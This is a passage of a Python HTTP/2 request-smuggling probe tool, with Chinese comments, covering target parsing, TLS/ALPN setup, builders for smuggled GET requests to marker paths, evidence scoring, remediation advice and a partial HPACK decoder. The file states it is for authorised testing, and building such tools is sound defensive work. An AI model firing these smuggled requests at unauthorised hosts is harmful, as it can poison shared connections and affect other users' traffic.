"""
httpsmuggle_h2_single v2 — HTTP/2 请求走私探测工具（修复版）

在原版（smuggle_common + httpsmuggle_h2 单文件拼接）基础上修复以下问题：

判定层（原版 P0，影响结论正确性）：
  [F1] 合规拒绝不再计为走私证据：s1 收到 RST_STREAM(PROTOCOL_ERROR/STREAM_CLOSED)
       或 GOAWAY(PROTOCOL_ERROR) 时记为 REJECTED_OK(w0)，不产生 DIFF_HANG /
       CONNECTION_KILLED —— 前端"正确拒绝毒包"与"漏洞表征"从此可区分
  [F2] 连接建立阶段失败（TLS/ALPN/网络）标记 phase='connect'，该轮判 INVALID，
       不再伪造成"毒包流挂起"强证据
  [F3] 请求统一携带 accept-encoding: identity，响应体按 content-encoding 解压
       （gzip/deflate），EV_MARKER 不再被压缩响应致盲
  [F4] MARKER 判定语境强化（对应用户缺陷 7）：
       - location 命中要求 2xx/3xx 语境
       - body 命中执行回显特征检测（q=h2cl / content-type / :authority 等请求
         痕迹同现则判回显页，大小写不敏感，修复原版 b'Transfer-Encoding'
         大小写失效问题）
       - victim 流命中 = EV_MARKER(w8, definitive)；毒包流命中降级
         EV_MARKER_S1(w5)，需复现确认
       - VICTIM_MISSING 前提改为"毒包流有完整响应"，不再用状态码猜测
  [F5] 基线采集（对应用户缺陷 2 的合理内核）：探测前 N 条 GET 建立 RTT 基线
       （p50/p95/max）写入报告；control 结果含 RTT；INVALID 轮不进入复现率分母

帧层健壮性：
  [F6] _strip_headers_payload / _strip_data_payload 边界与 padding 校验，
       非法帧抛 H2Error 并映射为 conn_error，不再让 IndexError 击穿会话
  [F7] 解析对端 SETTINGS（MAX_FRAME_SIZE），DATA 按对端上限分片（缺陷 1 方向的
       防御性加固：h2_frame 增加 3 字节长度上限断言）
  [F8] CONTINUATION 必须与前置 HEADERS 同流、HEADERS 不得交错未完成块；
       trailers 不再混入响应头列表
  [F9] 读循环实施 cfg.size_limit，超限记 size-limit 并停止（原版无界缓冲）
  [F10] 流 ID 由会话级计数器 new_stream() 递增分配（缺陷 4 方向的代码卫生）

输入 / 合规 / 工程：
  [F11] 会话目录加 pid + uuid 后缀，消除同秒并发覆写（缺陷 6）
  [F12] 移除硬编码默认目标：--url 必填，交互输入无默认值，EOFError 安全处理
  [F13] IP 直连：insecure 模式下 IP 目标不传 SNI；校验模式保留 IP（用于 IP SAN）
  [F14] 退出码分级：0=无发现，1=存在 MEDIUM，2=存在 HIGH，130=用户中断

仅供授权渗透测试使用，请勿对未授权目标使用。要求 Python 3.8+。

v2.1 增量（FIX 系列）：
  [FIX-2] 基线采集：失败重试（上限 3×n）、有效样本不足告警、
          5xx/BAD_CODES 慢错误路径不计入 RTT（404/405 等确定性快速响应仍计入）
  [FIX-3] 毒化等待自适应：clamp(0.5s, 基线 p95 RTT×3, 5s)，基线不足回退
          max(--delay, 1s)；control 与毒包轮同构使用同一等待值；--no-adaptive-delay 关闭
  [FIX-4] GOAWAY/RST 错误码全分类：拒绝{1,6,9}/良性{0,11,12,13 与 RST 7,8}/
          疑似{2=INTERNAL_ERROR→GOAWAY_INTERNAL_ERROR w2}/未知→CONN_KILLED；
          修复 GOAWAY(NO_ERROR)+connection-closed 组合被误报 CONN_KILLED 的问题；
          pump 对优雅 GOAWAY 继续读取在途流
  [FIX-6] H2.CL 新增 CL=0 变体（H2.CL0 独立技术）；不采用 CL±1（走私体错位）与
          oversized（无走私语义）变体
  核对后不修（缺陷不存在）：FIX-1（SPLIT 走私体在 DATA 帧，无头值 CRLF 注入路径；
          纯标准库 HPACK 原样编码）、FIX-5（control/每轮 probe 本就各自新建连接）、
          FIX-7（--size-limit 配置化已实现，无 8192 硬编码）
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import secrets
import socket
import ssl
import struct
import sys
import time
import uuid
import zlib
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Callable, Optional
from urllib.parse import urlparse

CRLF = b'\r\n'
BAD_CODES = {'400', '502', '503'}
# H2 错误码（RFC 9113 §7）
H2_ERR_NO_ERROR = 0
H2_ERR_PROTOCOL = 1
H2_ERR_INTERNAL = 2
H2_ERR_STREAM_CLOSED = 5
H2_ERR_FRAME_SIZE = 6
H2_ERR_REFUSED_STREAM = 7
H2_ERR_CANCEL = 8
H2_ERR_COMPRESSION = 9
H2_ERR_ENHANCE_CALM = 11
H2_ERR_INADEQ_SECURITY = 12
H2_ERR_HTTP11_REQUIRED = 13

# FIX-4：RST / GOAWAY 错误码分类（区分 合规拒绝 / 良性 / 疑似 / 未知）
RST_REJECT_CODES = {H2_ERR_PROTOCOL, H2_ERR_STREAM_CLOSED}        # 合规拒绝毒包流
RST_BENIGN_CODES = {H2_ERR_REFUSED_STREAM, H2_ERR_CANCEL}         # 容量/取消，非走私信号
GOAWAY_REJECT_CODES = {H2_ERR_PROTOCOL, H2_ERR_FRAME_SIZE,
                       H2_ERR_COMPRESSION}                        # 协议层合规拒绝
GOAWAY_SUSPECT_CODES = {H2_ERR_INTERNAL}                          # 后端处理异常（弱信号）
GOAWAY_BENIGN_CODES = {H2_ERR_NO_ERROR, H2_ERR_ENHANCE_CALM,
                       H2_ERR_INADEQ_SECURITY, H2_ERR_HTTP11_REQUIRED}


# ─── 配置 ─────────────────────────────────────────────────────────────────────
@dataclass(frozen=True)
class ProbeConfig:
    rounds: int = 3
    baseline_samples: int = 3
    mode: str = 'both'            # both / hang / shift
    protocol: str = 'h2'
    te_tier: str = 'ABC'
    fingerprint: bool = True
    connect_timeout: float = 10.0
    ttfb_timeout: float = 4.0
    phase_timeout: float = 4.0
    delay: float = 0.5
    adaptive_delay: bool = True       # FIX-3：按基线 p95 RTT 自适应毒化等待
    size_limit: int = 1 * 1024 * 1024
    insecure: bool = False
    repro_threshold: int = 2
    out_dir: Path = Path('smuggle_out_h2')


# ─── 目标解析 ─────────────────────────────────────────────────────────────────
@dataclass(frozen=True)
class Target:
    host: str
    port: int
    sni: str
    host_header: bytes
    path: bytes
    use_tls: bool
    is_ip: bool = False


def _reject_unsafe(text: str, what: str) -> None:
    if any(ch.isspace() or ord(ch) < 0x21 or ord(ch) == 0x7f for ch in text):
        raise ValueError(f'{what} 含空白/控制字符，拒绝构造请求: {text!r}')


def _is_ip(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def parse_target(user_input: str) -> Target:
    url = (user_input or '').strip()
    if not url:
        raise ValueError('目标 URL 为空（v2 已移除硬编码默认目标，必须显式指定）')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        raise ValueError(f'无法从输入中解析出主机名: {user_input!r}')
    if parsed.username or parsed.password:
        raise ValueError('不允许 user:pass@ 形式的 URL（凭据不得进入 Host 头）')
    _reject_unsafe(host, '主机名')

    scheme = parsed.scheme.lower()
    if scheme not in ('http', 'https'):
        raise ValueError(f'不支持的协议: {scheme}')
    default_port = 443 if scheme == 'https' else 80
    try:
        port = parsed.port or default_port
    except ValueError as e:
        raise ValueError(f'端口非法: {e}') from None

    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    _reject_unsafe(path, '路径')

    host_header = f'[{host}]' if ':' in host else host
    if port != default_port:
        host_header = f'{host_header}:{port}'

    try:
        host_header_b = host_header.encode('ascii')
        path_b = path.encode('ascii')
    except UnicodeEncodeError:
        raise ValueError('主机名/路径含非 ASCII 字符，请使用 ASCII 或百分号编码形式') from None

    return Target(host=host, port=port, sni=host, host_header=host_header_b,
                  path=path_b, use_tls=(scheme == 'https'), is_ip=_is_ip(host))


# ─── 走私 H1 请求原语（bytes）────────────────────────────────────────────────
def _smuggled_get_open(host: bytes, marker_path: bytes) -> bytes:
    return b'GET ' + marker_path + b' HTTP/1.1\r\nHost: ' + host + b'\r\n'


def _smuggled_get_closed(host: bytes, marker_path: bytes) -> bytes:
    return (b'GET ' + marker_path + b' HTTP/1.1\r\nHost: ' + host +
            b'\r\nConnection: keep-alive\r\n\r\n')


class EndReason(Enum):
    EOF = 'eof'
    FIRST_BYTE_TIMEOUT = 'first-byte-timeout'
    HEADER_TIMEOUT = 'header-timeout'
    BODY_TIMEOUT = 'body-timeout'
    IDLE_AFTER_COMPLETE = 'idle-after-complete'
    SIZE_LIMIT = 'size-limit'
    ERROR = 'error'


# ─── 网络层 ───────────────────────────────────────────────────────────────────
def open_connection(target: Target, insecure: bool, connect_timeout: float,
                    alpn_protos: Optional[list] = None):
    t0 = time.monotonic()
    raw = socket.create_connection((target.host, target.port), timeout=connect_timeout)
    connect_ms = (time.monotonic() - t0) * 1000.0
    tls_ms = 0.0
    sock = raw
    if target.use_tls:
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context()
        if alpn_protos:
            try:
                ctx.set_alpn_protocols(alpn_protos)
            except NotImplementedError:
                pass
        # F13：校验模式下 IP 目标交给标准库做 IP SAN 匹配（不发送 SNI 扩展）；
        # insecure 模式下 IP 目标直接不传 server_hostname，规避旧库对 IP-SNI 的分歧
        sni = target.sni
        if insecure and target.is_ip:
            sni = None
        t1 = time.monotonic()
        sock = ctx.wrap_socket(raw, server_hostname=sni)
        tls_ms = (time.monotonic() - t1) * 1000.0
    return sock, connect_ms, tls_ms


def probe_alpn(target: Target, cfg: ProbeConfig) -> Optional[str]:
    if not target.use_tls:
        return None
    try:
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout,
                                     alpn_protos=['h2', 'http/1.1'])
    except OSError:
        return None
    try:
        return sock.selected_alpn_protocol() if hasattr(sock, 'selected_alpn_protocol') else None
    finally:
        sock.close()


# ─── 每轮随机 token ───────────────────────────────────────────────────────────
def gen_marker_token() -> str:
    return 'mk' + secrets.token_hex(5)


def gen_victim_token() -> str:
    return 'vt' + secrets.token_hex(5)


def child_path(base_path: bytes, token: str) -> bytes:
    p = base_path.split(b'?', 1)[0]
    sep = b'' if p.endswith(b'/') else b'/'
    return p + sep + token.encode('ascii')


# ─── 证据模型 ─────────────────────────────────────────────────────────────────
EV_MARKER = 'MARKER_RESPONSE'          # victim 流 marker 响应        w8 definitive
EV_MARKER_S1 = 'MARKER_RESPONSE_S1'    # 毒包流 marker 命中（弱化）    w5
EV_QUEUE_SHIFT = 'QUEUE_SHIFT'         # 响应数偏离对照               w5
EV_DIFF_HANG = 'DIFFERENTIAL_HANG'     # 毒包挂起而对照正常            w4
EV_VICTIM_MISSING = 'VICTIM_MISSING'   # victim 响应被吞               w3
EV_CONN_KILLED = 'CONNECTION_KILLED'   # 毒包后连接被杀（非拒绝语义）  w2
EV_STATUS_ANOMALY = 'STATUS_ANOMALY'   # 状态码超出 基线∪对照 分布     w1
EV_ERROR_CODE = 'ERROR_CODE'           # 400/502/503 且对照无          w1
EV_SIZE_ANOMALY = 'SIZE_ANOMALY'       # 长度超出基线分布              w1
EV_REJECTED_OK = 'REJECTED_OK'         # 前端合规拒绝（RST/GOAWAY）    w0 informational
EV_GOAWAY_INTERNAL = 'GOAWAY_INTERNAL_ERROR'  # GOAWAY INTERNAL_ERROR   w2 弱信号

EV_WEIGHTS = {
    EV_MARKER: 8, EV_MARKER_S1: 5, EV_QUEUE_SHIFT: 5, EV_DIFF_HANG: 4,
    EV_VICTIM_MISSING: 3, EV_CONN_KILLED: 2, EV_STATUS_ANOMALY: 1,
    EV_ERROR_CODE: 1, EV_SIZE_ANOMALY: 1, EV_REJECTED_OK: 0,
    EV_GOAWAY_INTERNAL: 2,
}
EV_DEFINITIVE = {EV_MARKER}


@dataclass
class Evidence:
    code: str
    detail: str


@dataclass
class ControlResult:
    ok: bool
    end_reason: Optional[EndReason]
    response_count: int
    statuses: set
    victim_responded: bool          # victim 流有任何响应
    victim_token_seen: bool         # victim 流响应确证包含 token
    rtt_ms: Optional[float] = None
    error: Optional[str] = None


@dataclass
class BaselineResult:
    ok: bool
    statuses: set
    size_range: tuple
    rtts_ms: list
    attempts: int = 0                 # FIX-2：总尝试次数（含失败）
    error_samples: int = 0            # FIX-2：错误状态/网络失败样本数（诊断用）

    @property
    def insufficient(self) -> bool:   # FIX-2：有效样本不足 2 条
        return len(self.rtts_ms) < 2

    @property
    def p50_ms(self) -> Optional[float]:
        return _pct(self.rtts_ms, 50)

    @property
    def p95_ms(self) -> Optional[float]:
        return _pct(self.rtts_ms, 95)

    @property
    def max_ms(self) -> Optional[float]:
        return max(self.rtts_ms) if self.rtts_ms else None


def _adaptive_wait(baseline: BaselineResult, cfg: ProbeConfig) -> float:
    """FIX-3：毒化等待 = clamp(0.5, 基线 p95 RTT × 3, 5.0)。

    基线不足时回退 max(cfg.delay, 1.0)（保守值）。上限 5s 防止慢目标拖垮总时长。
    control 与毒包轮必须使用同一 wait 值以保持序列同构。
    """
    if not cfg.adaptive_delay:
        return cfg.delay
    if baseline.insufficient or not baseline.p95_ms:
        return max(cfg.delay, 1.0)
    return max(0.5, min((baseline.p95_ms / 1000.0) * 3, 5.0))


def _pct(xs: list, p: int) -> Optional[float]:
    if not xs:
        return None
    s = sorted(xs)
    k = min(len(s) - 1, max(0, round(p / 100 * (len(s) - 1))))
    return s[k]


@dataclass
class RoundAnalysis:
    evidences: list
    score: int
    confidence: str                  # HIGH / MEDIUM / LOW / INVALID
    statuses: list
    end_reason: Optional[EndReason]

    def has_evidence(self, code: str) -> bool:
        return any(e.code == code for e in self.evidences)

    @property
    def has_definitive(self) -> bool:
        return any(e.code in EV_DEFINITIVE for e in self.evidences)


@dataclass
class TechniqueVerdict:
    technique: str
    mode: str
    confidence: str
    verdict: str
    evidence_repro: dict
    rounds: list
    invalid_rounds: int = 0
    best_record: Optional[object] = None


def aggregate_technique(technique: str, mode: str, rounds: list,
                        repro_threshold: int = 2,
                        invalid_rounds: int = 0) -> TechniqueVerdict:
    n = len(rounds) or 1
    repro = {}
    for code in EV_WEIGHTS:
        hits = sum(1 for r in rounds if r.has_evidence(code))
        if hits:
            repro[code] = (hits, n)
    marker_hits = repro.get(EV_MARKER, (0, n))[0]
    strong_rounds = sum(1 for r in rounds if r.has_definitive or r.score >= 4)

    if marker_hits >= repro_threshold:
        confidence, note = 'HIGH', f'marker 响应在 {marker_hits}/{n} 轮复现'
    elif marker_hits == 1:
        confidence, note = 'MEDIUM', 'marker 响应仅单轮命中，按规则封顶 MEDIUM，建议加轮复现'
    elif strong_rounds >= 2:
        confidence, note = 'MEDIUM', f'{strong_rounds}/{n} 轮出现强证据（差分挂起/队列偏移）'
    elif strong_rounds == 1:
        confidence, note = 'MEDIUM', '单轮强证据，需复现确认'
    else:
        confidence, note = 'LOW', '无差分证据；前后端解析一致或目标已规范化处理'
    if invalid_rounds:
        note += f'（{invalid_rounds} 轮 INVALID 未计入）'
    verdict = f'[{technique}/{mode}] {note}'
    return TechniqueVerdict(technique, mode, confidence, verdict, repro, rounds,
                            invalid_rounds)


# ─── 工件落盘（F11：目录唯一化）──────────────────────────────────────────────
def _dec(b: bytes) -> str:
    return b.decode('utf-8', errors='backslashreplace')


class Artifacts:
    def __init__(self, root: Path):
        stamp = time.strftime('%Y%m%d-%H%M%S')
        uniq = f'{os.getpid()}-{uuid.uuid4().hex[:6]}'
        self.dir = root / f'{stamp}-{uniq}'
        self.raw_dir = self.dir / 'raw'
        self.raw_dir.mkdir(parents=True, exist_ok=True)
        self.jsonl = self.dir / 'session.jsonl'
        self.jsonl.touch()

    def _line(self, obj: dict) -> None:
        with self.jsonl.open('a', encoding='utf-8') as f:
            f.write(json.dumps(obj, ensure_ascii=False) + '\n')

    def save_report(self, report: dict) -> None:
        (self.dir / 'report.json').write_text(
            json.dumps(report, ensure_ascii=False, indent=2), encoding='utf-8')


SEP = '=' * 70


def section(title: str, content: str) -> None:
    print(f'\n{SEP}\n  {title}\n{SEP}')
    print(content)


# ─── 修复建议 ─────────────────────────────────────────────────────────────────
REMEDIATION = {
    'CL.TE/TE.CL': [
        '禁止同时接受 Content-Length 与 Transfer-Encoding：二者同时出现时直接返回 400 并关闭连接',
        '前端转发前必须以唯一分帧规则重写：剥离 TE 后按 CL 重算，或按 chunked 完整重编码，不得双写',
        'WAF/中间层不得在分帧语义之外改写或补充分帧头',
    ],
    'CL.CL': [
        '拒绝多个 Content-Length，除非所有值在去除前导零后完全一致且符合 RFC 9112 要求',
        '拒绝逗号列表、正号、前导零、尾随空白、obs-fold 等非规范形式，统一在边界代理层强制规范化',
        '超长/负数/非数值 Content-Length 一律 400 并断开连接',
    ],
    'TE.TE': [
        '只接受严格格式的 Transfer-Encoding: chunked（单一值、无空白混淆、无重复）',
        '拒绝畸形、重复、obs-fold、含非标准空白或控制字符的 TE 头，直接 400 并关闭连接',
        'TE 与 CL 同时出现时按 CL.TE/TE.CL 规则处理（拒绝 + 断连）',
    ],
    'H2': [
        'H2→H1 转换层必须校验 content-length 头与 DATA 帧总长一致，不一致即以流错误终止（RST_STREAM/GOAWAY）',
        '拒绝 H2 请求中的 transfer-encoding 与 connection 类逐跳头（RFC 9113 §8.2.1），出现即 400',
        '转换层重写 H1 请求时必须重新计算分帧，禁止将 DATA 内容透传到请求行位置',
    ],
}

ARCH_GUIDANCE = [
    '确保前端代理、负载均衡、WAF、后端服务器使用一致的 HTTP 解析规则（同一解析库，或通过解析一致性模糊测试验证）',
    '避免前端降级转发（H2/H3→H1）产生语义不一致：转换层必须完全重写分帧头',
    '对超时/畸形请求直接断开连接而非容错继续，防止被毒化的连接影响后续用户',
    '禁用后端 keep-alive 连接复用可缓解毒化扩散（以性能为代价的兜底方案）',
]

FAMILY_PATTERNS = [
    ('CL.TE', 'CL.TE/TE.CL'), ('TE.CL', 'CL.TE/TE.CL'),
    ('CL.CL', 'CL.CL'), ('TE.TE', 'TE.TE'), ('H2.', 'H2'),
]


def family_of(technique_name: str) -> Optional[str]:
    for prefix, family in FAMILY_PATTERNS:
        if technique_name.startswith(prefix):
            return family
    return None


def remediation_for(verdicts: list) -> dict:
    families = []
    for _, v in verdicts:
        if v.confidence in ('MEDIUM', 'HIGH'):
            fam = family_of(v.technique)
            if fam and fam not in families:
                families.append(fam)
    return {
        'triggered_families': families,
        'by_family': {f: REMEDIATION[f] for f in families},
        'architecture': ARCH_GUIDANCE,
    }


def print_remediation(rem: dict) -> None:
    lines = []
    for fam in rem['triggered_families']:
        lines.append(f'▸ {fam}')
        for item in rem['by_family'][fam]:
            lines.append(f'   - {item}')
    if not lines:
        lines.append('(无 MEDIUM/HIGH 级发现，仅输出架构层总则)')
    section('修复建议（按技术族）', '\n'.join(lines))
    section('架构层总则', '\n'.join(f'  - {x}' for x in rem['architecture']))


def build_report(target: Target, cfg: ProbeConfig, verdicts: list,
                 alpn: Optional[str] = None, fingerprint: Optional[dict] = None,
                 baseline: Optional[BaselineResult] = None,
                 version: str = 'V3.2-h2-fixed') -> dict:
    return {
        'generated': time.strftime('%Y-%m-%d %H:%M:%S'),
        'version': version,
        'target': {'host': target.host, 'port': target.port, 'tls': target.use_tls,
                   'path': _dec(target.path), 'is_ip': target.is_ip},
        'config': {'rounds': cfg.rounds, 'mode': cfg.mode, 'protocol': cfg.protocol,
                   'te_tier': cfg.te_tier, 'alpn': alpn,
                   'baseline_samples': cfg.baseline_samples,
                   'insecure': cfg.insecure, 'delay': cfg.delay,
                   'adaptive_delay': cfg.adaptive_delay},
        'baseline': (None if baseline is None else {
            'ok': baseline.ok,
            'statuses': sorted(baseline.statuses),
            'size_range': list(baseline.size_range),
            'rtt_ms': [round(x, 1) for x in baseline.rtts_ms],
            'rtt_p50_ms': round(baseline.p50_ms, 1) if baseline.p50_ms else None,
            'rtt_p95_ms': round(baseline.p95_ms, 1) if baseline.p95_ms else None,
            'rtt_max_ms': round(baseline.max_ms, 1) if baseline.max_ms else None,
            'attempts': baseline.attempts,
            'error_samples': baseline.error_samples,
            'insufficient': baseline.insufficient,
        }),
        'fingerprint': fingerprint,
        'techniques': [{
            'name': v.technique, 'mode': v.mode, 'confidence': v.confidence,
            'verdict': v.verdict,
            'invalid_rounds': v.invalid_rounds,
            'evidence_repro': {c: list(hn) for c, hn in v.evidence_repro.items()},
            'rounds': [{
                'score': r.score, 'confidence': r.confidence,
                'statuses': r.statuses,
                'end_reason': r.end_reason.value if r.end_reason else None,
                'evidences': [{'code': e.code, 'detail': e.detail,
                               'weight': EV_WEIGHTS[e.code]} for e in r.evidences],
            } for r in v.rounds],
        } for _, v in verdicts],
        'remediation': remediation_for(verdicts),
    }


# ═════════════════════════════════════════════════════════════════════════════
# HPACK（RFC 7541）
# ═════════════════════════════════════════════════════════════════════════════
HPACK_STATIC = [
    (b':authority', b''), (b':method', b'GET'), (b':method', b'POST'),
    (b':path', b'/'), (b':path', b'/index.html'), (b':scheme', b'http'),
    (b':scheme', b'https'), (b':status', b'200'), (b':status', b'204'),
    (b':status', b'206'), (b':status', b'304'), (b':status', b'400'),
    (b':status', b'404'), (b':status', b'500'), (b'accept-charset', b''),
    (b'accept-encoding', b'gzip, deflate'), (b'accept-language', b''),
    (b'accept-ranges', b''), (b'accept', b''), (b'access-control-allow-origin', b''),
    (b'age', b''), (b'allow', b''), (b'authorization', b''), (b'cache-control', b''),
    (b'content-disposition', b''), (b'content-encoding', b''),
    (b'content-language', b''), (b'content-length', b''), (b'content-location', b''),
    (b'content-range', b''), (b'content-type', b''), (b'cookie', b''), (b'date', b''),
    (b'etag', b''), (b'expect', b''), (b'expires', b''), (b'from', b''),
    (b'host', b''), (b'if-match', b''), (b'if-modified-since', b''),
    (b'if-none-match', b''), (b'if-range', b''), (b'if-unmodified-since', b''),
    (b'last-modified', b''), (b'link', b''), (b'location', b''),
    (b'max-forwards', b''), (b'proxy-authenticate', b''),
    (b'proxy-authorization', b''), (b'range', b''), (b'referer', b''),
    (b'refresh', b''), (b'retry-after', b''), (b'server', b''),
    (b'set-cookie', b''), (b'strict-transport-security', b''),
    (b'transfer-encoding', b''), (b'user-agent', b''), (b'vary', b''),
    (b'via', b''), (b'www-authenticate', b''),
]

_HUFFMAN_TABLE = [
    (0x1ff8, 13), (0x7fffd8, 23), (0xfffffe2, 28), (0xfffffe3, 28),
    (0xfffffe4, 28), (0xfffffe5, 28), (0xfffffe6, 28), (0xfffffe7, 28),
    (0xfffffe8, 28), (0xffffea, 24), (0x3ffffffc, 30), (0xfffffe9, 28),
    (0xfffffea, 28), (0x3ffffffd, 30), (0xfffffeb, 28), (0xfffffec, 28),
    (0xfffffed, 28), (0xfffffee, 28), (0xfffffef, 28), (0xffffff0, 28),
    (0xffffff1, 28), (0xffffff2, 28), (0x3ffffffe, 30), (0xffffff3, 28),
    (0xffffff4, 28), (0xffffff5, 28), (0xffffff6, 28), (0xffffff7, 28),
    (0xffffff8, 28), (0xffffff9, 28), (0xffffffa, 28), (0xffffffb, 28),
    (0x14, 6), (0x3f8, 10), (0x3f9, 10), (0xffa, 12),
    (0x1ff9, 13), (0x15, 6), (0xf8, 8), (0x7fa, 11),
    (0x3fa, 10), (0x3fb, 10), (0xf9, 8), (0x7fb, 11),
    (0xfa, 8), (0x16, 6), (0x17, 6), (0x18, 6),
    (0x0, 5), (0x1, 5), (0x2, 5), (0x19, 6),
    (0x1a, 6), (0x1b, 6), (0x1c, 6), (0x1d, 6),
    (0x1e, 6), (0x1f, 6), (0x5c, 7), (0xfb, 8),
    (0x7ffc, 15), (0x20, 6), (0xffb, 12), (0x3fc, 10),
    (0x1ffa, 13), (0x21, 6), (0x5d, 7), (0x5e, 7),
    (0x5f, 7), (0x60, 7), (0x61, 7), (0x62, 7),
    (0x63, 7), (0x64, 7), (0x65, 7), (0x66, 7),
    (0x67, 7), (0x68, 7), (0x69, 7), (0x6a, 7),
    (0x6b, 7), (0x6c, 7), (0x6d, 7), (0x6e, 7),
    (0x6f, 7), (0x70, 7), (0x71, 7), (0x72, 7),
    (0xfc, 8), (0x73, 7), (0xfd, 8), (0x1ffb, 13),
    (0x7fff0, 19), (0x1ffc, 13), (0x3ffc, 14), (0x22, 6),
    (0x7ffd, 19), (0x3, 5), (0x23, 6), (0x4, 5),
    (0x24, 6), (0x5, 5), (0x25, 6), (0x26, 6),
    (0x27, 6), (0x6, 5), (0x74, 7), (0x75, 7),
    (0x28, 6), (0x29, 6), (0x2a, 6), (0x7, 5),
    (0x2b, 6), (0x76, 7), (0x2c, 6), (0x8, 5),
    (0x9, 5), (0x2d, 6), (0x77, 7), (0x78, 7),
    (0x79, 7), (0x7a, 7), (0x7b, 7), (0x7ffe, 15),
    (0x7fc, 11), (0x3ffd, 14), (0x1ffd, 13), (0xffffffc, 28),
    (0xfffe6, 20), (0x3fffd2, 22), (0xfffe7, 20), (0xfffe8, 20),
    (0x3fffd3, 22), (0x3fffd4, 22), (0x3fffd5, 22), (0x7fffd9, 23),
    (0x3fffd6, 22), (0x7fffda, 23), (0x7fffdb, 23), (0x7fffdc, 23),
    (0x7fffdd, 23), (0x7fffde, 23), (0xffffeb, 24), (0x7fffdf, 23),
    (0xffffec, 24), (0xffffed, 24), (0x3fffd7, 22), (0x7fffe0, 23),
    (0xffffee, 24), (0x7fffe1, 23), (0x7fffe2, 23), (0x7fffe3, 23),
    (0x7fffe4, 23), (0x1fffdc, 21), (0x3fffd8, 22), (0x7fffe5, 23),
    (0x3fffd9, 22), (0x7fffe6, 23), (0x7fffe7, 23), (0xffffef, 24),
    (0x3fffda, 22), (0x1fffdd, 21), (0xfffe9, 20), (0x3fffdb, 22),
    (0x3fffdc, 22), (0x7fffe8, 23), (0x7fffe9, 23), (0x1fffde, 21),
    (0x7fffea, 23), (0x3fffdd, 22), (0x3fffde, 22), (0xfffff0, 24),
    (0x1fffdf, 21), (0x3fffdf, 22), (0x7fffeb, 23), (0x7fffec, 23),
    (0x1fffe0, 21), (0x1fffe1, 21), (0x3fffe0, 22), (0x1fffe2, 21),
    (0x7fffed, 23), (0x3fffe1, 22), (0x7fffee, 23), (0x7fffef, 23),
    (0xfffea, 24), (0x3fffe2, 22), (0x3fffe3, 22), (0x3fffe4, 22),
    (0x7ffff0, 23), (0x3fffe5, 22), (0x3fffe6, 22), (0x7ffff1, 23),
    (0x3ffffe0, 26), (0x3ffffe1, 26), (0xfffeb, 24), (0x7fff1, 19),
    (0x3fffe7, 22), (0x7ffff2, 23), (0x3fffe8, 22), (0x1ffffec, 25),
    (0x3ffffe2, 26), (0x3ffffe3, 26), (0x3ffffe4, 26), (0x7ffffde, 27),
    (0x7ffffdf, 27), (0x3ffffe5, 26), (0xfffff1, 24), (0x1ffffed, 25),
    (0x7fff2, 19), (0x1fffe3, 21), (0x3ffffe6, 26), (0x7ffffe0, 27),
    (0x7ffffe1, 27), (0x3ffffe7, 26), (0x7ffffe2, 27), (0xfffff2, 24),
    (0x1fffe4, 21), (0x1fffe5, 21), (0x3ffffe8, 26), (0x3ffffe9, 26),
    (0xffffffd, 28), (0x7ffffe3, 27), (0x7ffffe4, 27), (0x7ffffe5, 27),
    (0xfffec, 24), (0xfffff3, 24), (0xfffed, 24), (0x1fffe6, 21),
    (0x3fffe9, 22), (0x1fffe7, 21), (0x1fffe8, 21), (0x7ffff3, 23),
    (0x3fffea, 22), (0x3fffeb, 22), (0x1ffffee, 25), (0x1ffffef, 25),
    (0xfffff4, 24), (0xfffff5, 24), (0x3ffffea, 26), (0x7ffff4, 23),
    (0x3ffffeb, 26), (0x7ffffe6, 27), (0x3ffffec, 26), (0x3ffffed, 26),
    (0x7ffffe7, 27), (0x7ffffe8, 27), (0x7ffffe9, 27), (0x7ffffea, 27),
    (0x7ffffeb, 27), (0xffffffe, 28), (0x7ffffec, 27), (0x7ffffed, 27),
    (0x7ffffee, 27), (0x7ffffef, 27), (0x7fffff0, 27), (0x3ffffee, 26),
    (0x3fffffff, 30),
]

_HUFF_DECODE = {(code, bits): sym
                for sym, (code, bits) in enumerate(_HUFFMAN_TABLE)}


def huffman_decode(data: bytes) -> bytes:
    out = bytearray()
    code = bits = 0
    for byte in data:
        for shift in range(7, -1, -1):
            code = (code << 1) | ((byte >> shift) & 1)
            bits += 1
            if bits > 30:
                raise ValueError('Huffman 解码位串超长')
            sym = _HUFF_DECODE.get((code, bits))
            if sym is not None:
                if sym > 255:
                    raise ValueError('Huffman 数据中出现 EOS 符号')
                out.append(sym)
                code = bits = 0
    if bits >= 8 or code != (1 << bits) - 1:
        raise ValueError('Huffman padding 非法')
    return bytes(out)


def _hpack_int(data: bytes, pos: int, prefix_bits: int) -> tuple:
    mask = (1 << prefix_bits) - 1
    val = data[pos] & mask
    pos += 1
    if val < mask:
        return val, pos
    shift = 0
    while True:
        if pos >= len(data):
            raise ValueError('HPACK 整数截断')
        b = data[pos]
        pos += 1
        val += (b & 0x7f) << shift
        shift += 7
        if not b & 0x80:
            return val, pos
        if shift > 28:
            raise ValueError('HPACK 整数溢出')


def _hpack_str(data: bytes, pos: int) -> tuple:
    huff = bool(data[pos] & 0x80)
    length, pos = _hpack_int(data, pos, 7)
    if pos + length > len(data):
        raise ValueError('HPACK 字符串截断')
    raw = data[pos:pos + length]
    pos += length
    return (huffman_decode(raw) if huff else raw), pos


class HpackDecoder:
    def __init__(self, max_size: int = 4096):
        self.dyn: list = []
        self.max_size = max_size
        self._size = 0

    def _insert(self, name: bytes, value: bytes) -> None:
        self.dyn.insert(0, (name, value))
        self._size += len(name) + len(value) + 32
        self._evict()

    def _evict(self) -> None:
        while self._size > self.max_size and self.dyn:
            n, v = self.dyn.pop()
            self._size -= len(n) + len(v) + 32

    def _resize(self, size: int) -> None:
        self.max_size = size
        self._evict()

    def _lookup(self, idx: int) -> tuple:
        if 1 <= idx <= len(HPACK_STATIC):
            return HPACK_STATIC[idx - 1]
        d = idx - 1 - len(HPACK_STATIC)
        if 0 <= d < len(self.dyn):
